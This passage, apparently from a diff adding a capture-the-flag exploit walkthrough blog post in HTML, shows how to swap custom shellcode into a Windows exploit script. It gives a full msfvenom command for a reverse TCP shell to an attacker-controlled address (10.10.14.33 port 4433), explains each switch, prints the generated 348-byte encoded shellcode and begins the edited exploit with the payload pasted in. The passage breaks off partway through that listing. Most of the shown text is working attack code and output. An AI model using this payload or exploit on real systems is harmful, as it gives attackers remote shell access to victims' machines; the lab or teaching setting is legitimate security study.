+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x62\x37\x0c\xe2\x43\x31\x21\x1d\x10\xa1\x48\xbd\x52\x7d\x89&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xd3\xc9\xba\xd2\x97\xa1\xbe\xc2\x3e\x13\x7d\x9a\xcf\x43\x25&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x48\xa6\x5a\x15\xf9\xa6\xc9\xc2\x48\xee\x94\xc7\x3c\x43\x83&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x39\xce\xee\x85\xce\x23\x9a\xb4\xf5\xbe\x17\x79\x8b\xe7\x9a&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xa6\xae\x48\xb7\x66\xf7\x10\x89\xc9\xfa\x88\x64\x1a\xea\xc2&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x3c\xc9\xf2\x48\xee\x92\x7f\x87\xcb\x66\xad\x98\x8e\x1b\xac&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x92\x10\xa2\xa9\x9c\xb5\xc9\xe4\x28\x62\x1f\x9e\xf0\xdd\x42&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xf6\xab\x98\x31\xc4\x9c\xbb\x2a\xba\xb4\xc9\x45\x09\x16\x57&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xd2\xf7\xc3\xef\x6b\x32\x97\xbf\x2a\xdf\x43\x84\x42\x09\x16&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xbf\x12\xa6\x93\xaf\x12\xb6\x93\x87\xa8\xf9\x1c\x0f\xbd\x23&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x54\x85\x47\x9e\xc9\xe4\x42\x6b\xab\xed\x42\x04\xf3\x66\xa4&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x9c\xd3\xb9\x15\x9e\x5a\x4a\x36\x97\x3c\x3a\xc7\x36\xb7\xe3&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xbd\xb8\xcb\x9a\xae\x9e\x33\x5a\xe0\xa0\x3c\x3a\x2a\x95\xae&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x8b\x42\x7f\x20\xb8\x15\xa1\xf2\x19\x28\xe4\x9a\xb9\xa0\x0b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xa5\x28\x06\xd2\xff\xee\x43\x7b\x87\xcb\x52\x30\xc3\xab\x16&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xa6\x95\xb9\x14\xb0\x95\xa1\x14\xa0\x90\xb9\x2a\x8f\x0f\xd0&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xc4\x09\x16\x66\xa2\xb8\x95\xa9\xbd\xc6\xab\xe7\xc5\xeb\xa3&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x10\x97\x4d\x23\xf2\x68\xfc\xab\x49\xd7\x4b\x5e\x10\x97\xca&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xc5\x93\x48\x76\x38\x0f\x37\xf3\x78\xa8\x51\x84\xac\x85\x42&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xa5\x3c\x3a&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="c1"&gt;# ------------------------------------------------------------------------&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h4&gt;Generating shellcode&lt;/h4&gt;
+&lt;p&gt;We can generate our own shellcode using msfvenom.  Here is the command I used and an explanation of the switches I enabled:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msfvenom -p windows/shell_reverse_tcp &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.10.14.33 &lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4433&lt;/span&gt; &lt;span class="nv"&gt;EXITFUNC&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;thread -b &lt;span class="s2"&gt;&amp;quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&amp;quot;&lt;/span&gt; -f python -a x86 --platform windows -v shellcode
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-p windows/shell_reverse_tcp&lt;/code&gt;   Creates a reverse TCP stream from a Windows host.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;LHOST=10.10.14.33&lt;/code&gt;  Sets the IP for the reverse shell to connect to; this is almost always an attacker-controlled machine.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;LPORT=4433&lt;/code&gt; Sets the port that the reverse shell attempts to connect to.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;EXITFUNC=thread&lt;/code&gt;    Ensures that the exploit won't quit out after the shellcode executes.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"&lt;/code&gt;  Sets the bad characters; msfvenom will avoid using these in the shellcode. Null bytes '\x00' are a common setting.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-f python&lt;/code&gt;  Output format, set to Python since the script is in Python. The default is C, but either can work with a little editing.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-a x86&lt;/code&gt; The architecture of the target, most likely x86, 32 bit.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--platform windows&lt;/code&gt; Sets the target platform, in this case Windows. Msfvenom is smart enough to infer the target platform without this setting based on the module reverse shell we selected earlier, but explicit settings can't hurt.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-v shellcode&lt;/code&gt;   Changes the name of the shellcode variable from &lt;code&gt;buf&lt;/code&gt; to &lt;code&gt;shellcode&lt;/code&gt;, which is the one used in the exploit.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Which outputs this shellcode:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Found&lt;/span&gt; &lt;span class="mi"&gt;11&lt;/span&gt; &lt;span class="n"&gt;compatible&lt;/span&gt; &lt;span class="n"&gt;encoders&lt;/span&gt;
+&lt;span class="n"&gt;Attempting&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;encode&lt;/span&gt; &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;iterations&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;x86&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;shikata_ga_nai&lt;/span&gt;
+&lt;span class="n"&gt;x86&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;shikata_ga_nai&lt;/span&gt; &lt;span class="n"&gt;failed&lt;/span&gt; &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="n"&gt;valid&lt;/span&gt; &lt;span class="n"&gt;opcode&lt;/span&gt; &lt;span class="n"&gt;permutation&lt;/span&gt; &lt;span class="n"&gt;could&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;be&lt;/span&gt; &lt;span class="n"&gt;found&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;
+&lt;span class="n"&gt;Attempting&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;encode&lt;/span&gt; &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;iterations&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;generic&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;none&lt;/span&gt;
+&lt;span class="n"&gt;generic&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;none&lt;/span&gt; &lt;span class="n"&gt;failed&lt;/span&gt; &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;Encoding&lt;/span&gt; &lt;span class="n"&gt;failed&lt;/span&gt; &lt;span class="n"&gt;due&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;bad&lt;/span&gt; &lt;span class="n"&gt;character&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x00&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;Attempting&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;encode&lt;/span&gt; &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;iterations&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;x86&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;call4_dword_xor&lt;/span&gt;
+&lt;span class="n"&gt;x86&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;call4_dword_xor&lt;/span&gt; &lt;span class="n"&gt;succeeded&lt;/span&gt; &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="mi"&gt;348&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;iteration&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;x86&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;call4_dword_xor&lt;/span&gt; &lt;span class="n"&gt;chosen&lt;/span&gt; &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;final&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="mi"&gt;348&lt;/span&gt;
+&lt;span class="n"&gt;Payload&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;348&lt;/span&gt; &lt;span class="nb"&gt;bytes&lt;/span&gt;
+&lt;span class="n"&gt;Final&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1953&lt;/span&gt; &lt;span class="nb"&gt;bytes&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x5e\x81\x76\x0e\x93\xb9\x8e\xef\x83\xee\xfc&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xe2\xf4\x6f\x51\x0c\xef\x93\xb9\xee\x66\x76&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x88\x4e\x8b\x18\xe9\xbe\x64\xc1\xb5\x05\xbd&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x87\x32\xfc\xc7\x9c\x0e\xc4\xc9\xa2\x46\x22&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xd3\xf2\xc5\x8c\xc3\xb3\x78\x41\xe2\x92\x7e&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x6c\x1d\xc1\xee\x05\xbd\x83\x32\xc4\xd3\x18&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xf5\x9f\x97\x70\xf1\x8f\x3e\xc2\x32\xd7\xcf&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x92\x6a\x05\xa6\x8b\x5a\xb4\xa6\x18\x8d\x05&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xee\x45\x88\x71\x43\x52\x76\x83\xee\x54\x81&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x6e\x9a\x65\xba\xf3\x17\xa8\xc4\xaa\x9a\x77&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xe1\x05\xb7\xb7\xb8\x5d\x89\x18\xb5\xc5\x64&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xcb\xa5\x8f\x3c\x18\xbd\x05\xee\x43\x30\xca&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xcb\xb7\xe2\xd5\x8e\xca\xe3\xdf\x10\x73\xe6&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xd1\xb5\x18\xab\x65\x62\xce\xd1\xbd\xdd\x93&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xb9\xe6\x98\xe0\x8b\xd1\xbb\xfb\xf5\xf9\xc9&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x94\x46\x5b\x57\x03\xb8\x8e\xef\xba\x7d\xda&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xbf\xfb\x90\x0e\x84\x93\x46\x5b\xbf\xc3\xe9&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xde\xaf\xc3\xf9\xde\x87\x79\xb6\x51\x0f\x6c&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x6c\x19\x85\x96\xd1\x84\xe5\x9d\x98\xe6\xed&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x93\xa8\xdf\x66\x75\xd3\x9e\xb9\xc4\xd1\x17&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x4a\xe7\xd8\x71\x3a\x16\x79\xfa\xe3\x6c\xf7&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x86\x9a\x7f\xd1\x7e\x5a\x31\xef\x71\x3a\xfb&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xda\xe3\x8b\x93\x30\x6d\xb8\xc4\xee\xbf\x19&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xf9\xab\xd7\xb9\x71\x44\xe8\x28\xd7\x9d\xb2&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xee\x92\x34\xca\xcb\x83\x7f\x8e\xab\xc7\xe9&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xd8\xb9\xc5\xff\xd8\xa1\xc5\xef\xdd\xb9\xfb&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xc0\x42\xd0\x15\x46\x5b\x66\x73\xf7\xd8\xa9&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x6c\x89\xe6\xe7\x14\xa4\xee\x10\x46\x02\x6e&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xf2\xb9\xb3\xe6\x49\x06\x04\x13\x10\x46\x85&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x88\x93\x99\x39\x75\x0f\xe6\xbc\x35\xa8\x80&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xcb\xe1\x85\x93\xea\x71\x3a&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;After pasting, the finished result should have your shellcode in place of the original, like so:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#------------------------------------------------------------------------                                                                      &lt;/span&gt;
+&lt;span class="c1"&gt;# REPLACE THIS SHELLCODE with shellcode generated for your use&lt;/span&gt;
+&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;SNIP&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+
+
+&lt;span class="c1"&gt;# Reverse TCP to 10.10.14.33 on port 4433:&lt;/span&gt;
+&lt;span class="c1"&gt;# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.33 LPORT=4433 EXITFUNC=thread -b &amp;quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&amp;quot; -f python -a x86 --platform windows -v shellcode&lt;/span&gt;
+
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x5e\x81\x76\x0e\x93\xb9\x8e\xef\x83\xee\xfc&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xe2\xf4\x6f\x51\x0c\xef\x93\xb9\xee\x66\x76&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x88\x4e\x8b\x18\xe9\xbe\x64\xc1\xb5\x05\xbd&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
